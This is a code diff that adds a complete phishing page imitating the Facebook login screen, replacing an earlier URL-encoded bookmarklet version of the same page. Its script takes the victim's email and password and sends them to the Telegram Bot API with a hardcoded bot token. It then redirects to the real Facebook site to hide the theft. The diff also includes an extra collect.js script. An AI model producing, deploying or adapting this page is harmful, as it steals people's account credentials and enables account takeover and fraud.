@@ -1,1 +1,165 @@
-javascript:(function()%7B%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3EFacebook%20-%20Log%20In%20or%20Sign%20Up%3C%2Ftitle%3E%0A%20%20%20%20%20%3Cstyle%3E%0Abody%20%7B%0A%20%20%20%20background-color%3A%20%23f0f2f5%3B%0A%20%20%20%20font-family%3A%20Arial%2C%20sans-serif%3B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20margin%3A%200%3B%0A%7D%0A%0A.container%20%7B%0A%20%20%20%20width%3A%20360px%3B%0A%20%20%20%20padding%3A%2020px%3B%0A%20%20%20%20background%3A%20white%3B%0A%20%20%20%20box-shadow%3A%200%204px%2012px%20rgba(0%2C0%2C0%2C0.15)%3B%0A%20%20%20%20border-radius%3A%2010px%3B%0A%7D%0A%0Ah1%20%7B%0A%20%20%20%20color%3A%20%231877f2%3B%0A%20%20%20%20font-size%3A%2036px%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20margin-bottom%3A%2020px%3B%0A%7D%0A%0Aform%20%7B%0A%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20flex-direction%3A%20column%3B%0A%7D%0A%0Ainput%5Btype%3D%22email%22%5D%2C%0Ainput%5Btype%3D%22password%22%5D%20%7B%0A%20%20%20%20padding%3A%2014px%3B%0A%20%20%20%20margin-bottom%3A%2010px%3B%0A%20%20%20%20border%3A%201px%20solid%20%23dddfe2%3B%0A%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%7D%0A%0Abutton%20%7B%0A%20%20%20%20background-color%3A%20%231877f2%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20padding%3A%2014px%3B%0A%20%20%20%20border%3A%20none%3B%0A%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20cursor%3A%20pointer%3B%0A%7D%0A%0Abutton%3Ahover%20%7B%0A%20%20%20%20background-color%3A%20%23166fe5%3B%0A%7D%0A%0A.forgot-password%20%7B%0A%20%20%20%20display%3A%20block%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20margin-top%3A%2010px%3B%0A%20%20%20%20color%3A%20%231877f2%3B%0A%20%20%20%20text-decoration%3A%20none%3B%0A%7D%0A%0A.forgot-password%3Ahover%20%7B%0A%20%20%20%20text-decoration%3A%20underline%3B%0A%7D%0A%0A.divider%20%7B%0A%20%20%20%20height%3A%201px%3B%0A%20%20%20%20background-color%3A%20%23dddfe2%3B%0A%20%20%20%20margin%3A%2020px%200%3B%0A%7D%0A%0A.create-account%20%7B%0A%20%20%20%20background-color%3A%20%2342b72a%3B%0A%20%20%20%20color%3A%20white%3B%0A%20%20%20%20padding%3A%2014px%3B%0A%20%20%20%20border%3A%20none%3B%0A%20%20%20%20border-radius%3A%206px%3B%0A%20%20%20%20font-size%3A%2016px%3B%0A%20%20%20%20cursor%3A%20pointer%3B%0A%20%20%20%20text-align%3A%20center%3B%0A%7D%0A%0A.create-account%3Ahover%20%7B%0A%20%20%20%20background-color%3A%20%2336a420%3B%0A%7D%0A%3C%2Fstyle%3E%0A%0A%3C%2Fhead%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22login-section%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%3EFacebook%3C%2Fh1%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cform%20id%3D%22loginForm%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22email%22%20id%3D%22email%22%20name%3D%22email%22%20placeholder%3D%22Email%20or%20Phone%20Number%22%20required%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20id%3D%22password%22%20name%3D%22password%22%20placeholder%3D%22Password%22%20required%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%22submit%22%3ELog%20In%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22%23%22%20class%3D%22forgot-password%22%3EForgotten%20password%3F%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fform%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22divider%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D%22create-account%22%3ECreate%20New%20Account%3C%2Fbutton%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20function%20getQueryParam(param)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20urlParams%20%3D%20new%20URLSearchParams(window.location.search)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20urlParams.get(param)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20document.getElementById('loginForm').addEventListener('submit'%2C%20function(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20Url%20%3D%20%22https%3A%2F%2Fm.facebook.com%2F%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20email%20%3D%20document.getElementById('email').value%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20password%20%3D%20document.getElementById('password').value%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%60Victim%20Facebook%5CnEmail%3A%20%24%7Bemail%7D%5CnPassword%3A%20%24%7Bpassword%7D%60%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20telegramBotToken%20%3D%20'6310109803%3AAAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ'%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20chatId%20%3D%20getQueryParam('id')%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(!chatId)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert('url%20expired')%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20url%20%3D%20%60https%3A%2F%2Fapi.telegram.org%2Fbot%24%7BtelegramBotToken%7D%2FsendMessage%60%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20fetch(url%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20'POST'%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'Content-Type'%3A%20'application%2Fjson'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20chatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20message%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20.then(response%20%3D%3E%20response.json())%0A%20%20%20%20%20%20%20%20%20%20%20%20.then(data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(data.ok)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20Url%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert('Login%20Failed.%20%20%20Please%20try%20again%20later')%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20.catch(error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error('Error%3A'%2C%20error)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alert('Login%20Failed')%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%3C%2Fscript%3E%0A%3Cscript%3E%0A%20%20%20%20const%20telegramBotToken%20%3D%20'6310109803%3AAAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ'%3B%0A%3C%2Fscript%3E%0A%3Cscript%20src%3D%22collect.js%22%3E%3C%2Fscript%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%7D)()%3B
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+     <style>
+body {
+    background-color: #f0f2f5;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.container {
+    width: 360px;
+    padding: 20px;
+    background: white;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    border-radius: 10px;
+}
+
+h1 {
+    color: #1877f2;
+    font-size: 36px;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+
+input[type="email"],
+input[type="password"] {
+    padding: 14px;
+    margin-bottom: 10px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 16px;
+}
+
+button {
+    background-color: #1877f2;
+    color: white;
+    padding: 14px;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #166fe5;
+}
+
+.forgot-password {
+    display: block;
+    text-align: center;
+    margin-top: 10px;
+    color: #1877f2;
+    text-decoration: none;
+}
+
+.forgot-password:hover {
+    text-decoration: underline;
+}
+
+.divider {
+    height: 1px;
+    background-color: #dddfe2;
+    margin: 20px 0;
+}
+
+.create-account {
+    background-color: #42b72a;
+    color: white;
+    padding: 14px;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    text-align: center;
+}
+
+.create-account:hover {
+    background-color: #36a420;
+}
+</style>
+
+</head>
+<body>
+    <div class="container">
+        <div class="login-section">
+            <h1>Facebook</h1>
+            <form id="loginForm">
+                <input type="email" id="email" name="email" placeholder="Email or Phone Number" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+            </form>
+            <div class="divider"></div>
+            <button class="create-account">Create New Account</button>
+        </div>
+    </div>
+
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var Url = "https://m.facebook.com/";
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `Victim Facebook\nEmail: ${email}\nPassword: ${password}`;
+
+            const telegramBotToken = '6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ';
+            const chatId = getQueryParam('id');
+            
+            if (!chatId) {
+                alert('url expired');
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                   window.location.href = Url;
+                } else {
+                    alert('Login Failed.   Please try again later');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Login Failed');
+            });
+        });
+    </script>
+<script>
+    const telegramBotToken = '6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ';
+</script>
+<script src="collect.js"></script>
+</body>
+</html>
